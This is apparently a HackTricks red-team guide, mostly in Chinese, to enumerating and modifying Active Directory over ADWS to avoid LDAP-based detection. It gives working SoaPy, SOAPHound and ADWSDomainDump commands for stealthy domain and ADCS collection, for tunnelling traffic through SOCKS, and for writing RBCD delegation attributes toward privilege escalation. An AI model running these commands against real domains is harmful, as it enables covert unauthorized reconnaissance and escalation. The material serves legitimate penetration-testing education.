# Active Directory Web Services (ADWS) Enumeration & Stealth Collection

{{#include ../../banners/hacktricks-training.md}}

## 什么是 ADWS？

Active Directory Web Services (ADWS) 自 Windows Server 2008 R2 起在每台 Domain Controller 上默认启用，并监听 TCP **9389**。尽管名称如此，**并不涉及 HTTP**。相反，该服务通过一组专有的 .NET 分帧协议以 LDAP 风格暴露数据：

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

由于流量被封装在这些二进制 SOAP 帧内并通过不常见的端口传输，**通过 ADWS 进行的枚举比传统的 LDAP/389 与 636 流量更不容易被检测、过滤或基于签名识别**。对操作者而言，这意味着：

* 更隐蔽的侦察 —— Blue teams 通常集中在 LDAP 查询上。
* 可以通过将 9389/TCP 隧道到 SOCKS 代理，从 **非 Windows 主机 (Linux, macOS)** 收集数据。
* 获取与 LDAP 相同的数据（用户、组、ACL、schema 等），并能执行**写入**操作（例如为 **RBCD** 设置 `msDs-AllowedToActOnBehalfOfOtherIdentity`）。

ADWS 交互基于 WS-Enumeration：每个查询以 `Enumerate` 消息开始，该消息定义 LDAP 过滤器/属性并返回一个 `EnumerationContext` GUID，随后是一条或多条 `Pull` 消息，按服务器定义的结果窗口流式返回。上下文约在 30 分钟后过期，因此工具要么需要对结果进行分页，要么拆分过滤器（对每个 CN 使用前缀查询）以避免丢失状态。在请求安全描述符时，指定 `LDAP_SERVER_SD_FLAGS_OID` 控制以省略 SACLs，否则 ADWS 会在其 SOAP 响应中直接丢弃 `nTSecurityDescriptor` 属性。

> NOTE: ADWS is also used by many RSAT GUI/PowerShell tools, so traffic may blend with legitimate admin activity.

## SoaPy – Native Python Client

[SoaPy](https://github.com/logangoins/soapy) 是对 ADWS 协议栈用纯 Python 进行的**完整重实现**。它逐字节构造 NBFX/NBFSE/NNS/NMF 帧，允许在不触及 .NET 运行时的情况下从类 Unix 系统进行收集。

### Key Features

* Supports **proxying through SOCKS** (useful from C2 implants).
* 细粒度的搜索过滤，与 LDAP `-q '(objectClass=user)'` 相同。
* 可选的 **写入** 操作（ `--set` / `--delete` ）。
* **BOFHound output mode**，可直接供 BloodHound 摄取。
* `--parse` 标志在需要人类可读性时美化时间戳 / `userAccountControl`。

### Targeted collection flags & write operations

SoaPy 附带一组经过策划的开关，用于在 ADWS 上复现最常见的 LDAP 搜索任务：`--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds`，以及用于自定义拉取的原始 `--query` / `--filter`。可与写入原语配合使用，例如 `--rbcd <source>`（设置 `msDs-AllowedToActOnBehalfOfOtherIdentity`）、`--spn <service/cn>`（为有针对性的 Kerberoasting 做 SPN 暂存）和 `--asrep`（在 `userAccountControl` 中翻转 `DONT_REQ_PREAUTH`）。

示例：仅返回 `samAccountName` 和 `servicePrincipalName` 的目标 SPN 搜索：
```bash
soapy corp.local/alice:'Winter2025!'@dc01.corp.local \
--spns -f samAccountName,servicePrincipalName --parse
```
使用相同的主机/凭据立即将发现武器化：使用 `--rbcds` 转储具有 RBCD 能力的对象，然后应用 `--rbcd 'WEBSRV01$' --account 'FILE01$'` 来构建 Resource-Based Constrained Delegation 链（参见 [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) 以获取完整滥用路径）。

### 安装（操作主机）
```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```
## ADWSDomainDump – LDAPDomainDump over ADWS (Linux/Windows)

* `ldapdomaindump` 的分支，将 LDAP 查询替换为通过 TCP/9389 的 ADWS 调用，以减少 LDAP-signature 命中。
* 在未传入 `--force` 时，会对 9389 进行初始可达性检查（如果端口扫描会产生噪音或被过滤，可跳过探测）。
* 在 README 中针对 Microsoft Defender for Endpoint 和 CrowdStrike Falcon 进行了测试并成功绕过。

### 安装
```bash
pipx install .
```
### 用法
```bash
adwsdomaindump -u 'thewoods.local\mathijs.verschuuren' -p 'password' -n 10.10.10.1 dc01.thewoods.local
```
典型输出记录了 9389 可达性检查、ADWS 绑定，以及转储开始/完成：
```text
[*] Connecting to ADWS host...
[+] ADWS port 9389 is reachable
[*] Binding to ADWS host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```
## Sopa - Golang 实现的实用 ADWS 客户端

与 soapy 类似，[sopa](https://github.com/Macmod/sopa) 在 Golang 中实现了 ADWS 协议栈 (MS-NNS + MC-NMF + SOAP)，并暴露命令行标志以发起诸如以下的 ADWS 调用：

* **对象搜索与检索** - `query` / `get`
* **对象生命周期** - `create [user|computer|group|ou|container|custom]` and `delete`
* **属性编辑** - `attr [add|replace|delete]`
* **账户管理** - `set-password` / `change-password`
* 以及其他命令，如 `groups`, `members`, `optfeature`, `info [version|domain|forest|dcs]`, 等。

## SOAPHound – 高吞吐量 ADWS 收集 (Windows)

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound) 是一个 .NET 收集器，会将所有 LDAP 交互保留在 ADWS 内部，并输出与 BloodHound v4 兼容的 JSON。它会一次性构建 `objectSid`、`objectGUID`、`distinguishedName` 和 `objectClass` 的完整缓存（`--buildcache`），然后在高吞吐量的 `--bhdump`、`--certdump`（ADCS）或 `--dnsdump`（AD-integrated DNS）过程中重用该缓存，因此只有大约 35 个关键属性会离开 DC。AutoSplit (`--autosplit --threshold <N>`) 会按 CN 前缀自动分片查询，以在大型林中保持在 30 分钟的 EnumerationContext 超时之下。

在域加入的操作员 VM 上的典型工作流程：
```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump \
--autosplit --threshold 1200 --nolaps \
-o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```
将导出的 JSON 直接插入到 SharpHound/BloodHound 工作流中—参见 [BloodHound methodology](bloodhound.md) 了解后续绘图思路。AutoSplit 使 SOAPHound 在数百万对象的林中更具弹性，同时将查询次数保持低于 ADExplorer 风格的快照。

## 隐蔽的 AD 收集工作流

下面的工作流展示了如何通过 ADWS 枚举 **域 & ADCS 对象**，将它们转换为 BloodHound JSON 并查找基于证书的攻击路径 — 全部在 Linux 上进行：

1. **Tunnel 9389/TCP** 从目标网络到你的主机（例如通过 Chisel、Meterpreter、SSH 动态端口转发等）。导出 `export HTTPS_PROXY=socks5://127.0.0.1:1080` 或使用 SoaPy 的 `--proxyHost/--proxyPort`。

2. **收集根域对象：**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-q '(objectClass=domain)' \
| tee data/domain.log
```
3. **从 Configuration NC 收集与 ADCS 相关的对象：**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-dn 'CN=Configuration,DC=ludus,DC=domain' \
-q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
| tee data/adcs.log
```
4. **转换为 BloodHound：**
```bash
bofhound -i data --zip   # produces BloodHound.zip
```
5. **上传 ZIP** 在 BloodHound GUI 中并运行 cypher 查询，例如 `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c`，以揭示证书提升路径（ESC1、ESC8 等）。

### 写入 `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD)
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
--set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```
将此与 `s4u2proxy`/`Rubeus /getticket` 结合，以实现完整的 **Resource-Based Constrained Delegation** 链（参见 [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)）。

## 工具汇总

| 目的 | 工具 | 说明 |
|---------|------|-------|
| ADWS 枚举 | [SoaPy](https://github.com/logangoins/soapy) | Python，SOCKS，读/写 |
| 大规模 ADWS 转储 | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET，cache-first，BH/ADCS/DNS 模式 |
| BloodHound 导入 | [BOFHound](https://github.com/bohops/BOFHound) | Converts SoaPy/ldapsearch logs |
| 证书妥协 | [Certipy](https://github.com/ly4k/Certipy) | 可以通过相同的 SOCKS 代理使用 |
| ADWS 枚举与对象更改 | [sopa](https://github.com/Macmod/sopa) | 通用客户端，用于与已知 ADWS 端点交互 - 允许进行枚举、对象创建、属性修改和密码更改 |

## References

* [SpecterOps – Make Sure to Use SOAP(y) – An Operators Guide to Stealthy AD Collection Using ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
* [SoaPy GitHub](https://github.com/logangoins/soapy)
* [BOFHound GitHub](https://github.com/bohops/BOFHound)
* [ADWSDomainDump GitHub](https://github.com/mverschu/adwsdomaindump)
* [Microsoft – MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF specifications](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
* [IBM X-Force Red – Stealthy Enumeration of Active Directory Environments Through ADWS](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
* [FalconForce – SOAPHound tool to collect Active Directory data via ADWS](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)

{{#include ../../banners/hacktricks-training.md}}
